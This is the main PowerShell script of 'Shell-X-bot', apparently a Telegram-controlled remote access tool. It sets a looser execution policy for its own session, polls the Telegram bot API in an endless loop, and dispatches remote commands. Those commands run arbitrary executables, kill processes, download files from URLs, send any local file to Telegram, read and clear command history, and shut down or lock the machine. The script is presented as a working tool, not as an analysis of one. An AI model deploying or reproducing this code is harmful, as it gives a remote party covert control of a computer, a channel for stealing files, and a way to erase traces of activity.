# Check current execution policy and adjust if necessary
$currentPolicy = Get-ExecutionPolicy
if ($currentPolicy -eq 'Restricted' -or $currentPolicy -eq 'AllSigned') {
    Write-Host "Current execution policy is '$currentPolicy'. Temporarily setting it to 'RemoteSigned' for this session."
    Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope Process -Force
}

# Import configuration
. .\config.ps1

# Import utility modules
. .\utils\telegram.ps1

# Import command modules
. .\commands\file_comm.ps1
. .\commands\system.ps1
. .\commands\process.ps1
. .\commands\file_transf.ps1
. .\commands\download.ps1

# Required PowerShell modules
Import-Module Microsoft.PowerShell.Security
Import-Module Microsoft.PowerShell.Utility
Import-Module NetworkConnectivityStatus
Import-Module NetworkSwitchManager

# Initialize rate limiting variables
$script:messageCount = 0
$script:lastResetTime = Get-Date
$script:rateLimit = 7  # messages per minute
$script:rateLimitWindow = 60  # seconds

# Function to send a message to Telegram
function Send-TelegramMessage($message) {
    # Check rate limit
    $currentTime = Get-Date
    $timeSinceReset = ($currentTime - $script:lastResetTime).TotalSeconds

    # Reset counter if a minute has passed
    if ($timeSinceReset -ge $script:rateLimitWindow) {
        $script:messageCount = 0
        $script:lastResetTime = $currentTime
    }

    # Check if we've hit the rate limit
    if ($script:messageCount -ge $script:rateLimit) {
        $waitTime = $script:rateLimitWindow - $timeSinceReset
        $warningMessage = "⚠️ Rate limit reached! Waiting for $([math]::Round($waitTime)) seconds before sending more messages. (Limit: $($script:rateLimit) messages per minute)"
        Write-Host $warningMessage
        Start-Sleep -Seconds $waitTime
        $script:messageCount = 0
        $script:lastResetTime = Get-Date
    }

    # Send the message
    $url = "https://api.telegram.org/bot$($botToken)/sendMessage"
    $body = @{
        chat_id = $chatID
        text    = $message
    }
    Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType 'application/x-www-form-urlencoded'
    
    # Increment message counter
    $script:messageCount++
}

# Function to get updates (commands) from Telegram
function Get-TelegramUpdates($offset) {
    $url = "https://api.telegram.org/bot$($botToken)/getUpdates?offset=$($offset)"
    $updates = Invoke-RestMethod -Uri $url -Method Get
    return $updates.result
}

# Function to send a welcome message
function Send-WelcomeMessage {
    $welcomeMessage = @"
*Welcome to the Telegram Bot!* 

*HIGH RISK COMMANDS* (System Control)
[WARNING] These commands can affect system operation
 /lockcomputer - Lock Computer
 /logoff - Log off current user
 /shutdown - Shutdown the computer or set time in seconds
 /restart - Restart the computer
 /showmessage <content> - Show Custom Message in a Dialog
 /killprocess <process_id> | <application_name> - Kill a running process
 /runprocess <exe_path> [args] - Run a process or executable file

*MEDIUM RISK COMMANDS* (File Operations)
[CAUTION] These commands can modify files and data
 /createfile <file_path> <content> - Create a file with content
 /removefile <file_path> - Remove the specified file
 /listfiles <directory_path> - List all files in directory
 /sendfile <file_path> - Send a file to Telegram
 /download <url> <save_path> - Download a file from internet
 /getfilecontent <file_path> - Get content of a file
 /runfile <file_path> - Run any file by path

*LOW RISK COMMANDS* (Information Gathering)
[INFO] These commands only retrieve information
 /sysinfo - Get system information
 /getcurrentdir - Get current directory
 /gethardwareinfo - Get Hardware Info
 /gethistory - Get CMD/PowerShell History
 /clearhistory - Clear command history
 /getsystemstatus - Get system status (battery, CPU, RAM, network)
 /getip - Get your IP address
 /getHardwaredevices - Get All Hardware Device info
 /getopenedapplications - Get opened applications
 /getuptime - Get system uptime
 /getstoragedetails - Get storage information

*Other Commands*
 /start - Show this welcome message
 /help - Get help and repository link

*Note:* Commands are categorized by risk level:
[WARNING] High Risk - Can affect system operation
[CAUTION] Medium Risk - Can modify files and data
[INFO] Low Risk - Information gathering only
"@

    Send-TelegramMessage -message $welcomeMessage
}

# Function to handle commands
function Process-Command($command) {
    $parts = $command -split " "

    switch ($parts[0]) {
        "/start" {
            Send-WelcomeMessage
        }
        "/help" {
            $defaultLinks = "https://github.com/hackresist/Shell-X-bot "
            Send-TelegramMessage -message "Read the commads uses.Here are the links: $defaultLinks"
        }
        default {
            # Try to process the command in each module
            $commandProcessed = $false
            
            # File commands
            if ($parts[0] -match '^(/createfile|/removefile|/listfiles|/getfilecontent|/runfile)$') {
                Process-FileCommands -parts $parts
                $commandProcessed = $true
            }
            
            # System commands
            if ($parts[0] -match '^(/logoff|/showmessage|/lockcomputer|/shutdown|/restart|/sysinfo|/getcurrentdir|/gethardwareinfo|/gethistory|/clearhistory|/getsystemstatus|/getip|/getHardwaredevices|/getopenedapplications|/getuptime|/getstoragedetails)$') {
                Process-SystemCommands -parts $parts
                $commandProcessed = $true
            }
            
            # Process commands
            if ($parts[0] -match '^(/killprocess|/runprocess)$') {
                Process-ProcessCommands -parts $parts
                $commandProcessed = $true
            }

            # File transfer commands
            if ($parts[0] -match '^(/sendfile)$') {
                Process-FileTransferCommands -parts $parts
                $commandProcessed = $true
            }

            # Download commands
            if ($parts[0] -match '^(/download)$') {
                Process-DownloadCommands -parts $parts
                $commandProcessed = $true
            }
            
            if (-not $commandProcessed) {
                Send-TelegramMessage -message "Unknown command. Type /start to see available commands."
            }
        }
    }
}

# Main loop to listen for commands
while ($true) {
    $updates = Get-TelegramUpdates $script:lastUpdateId
    foreach ($update in $updates) {
        $script:lastUpdateId = $update.update_id + 1  # Increment to the next update ID
        if ($update.message -and $update.message.text) {
            Process-Command $update.message.text
        }
    }
    Start-Sleep -Seconds 3
}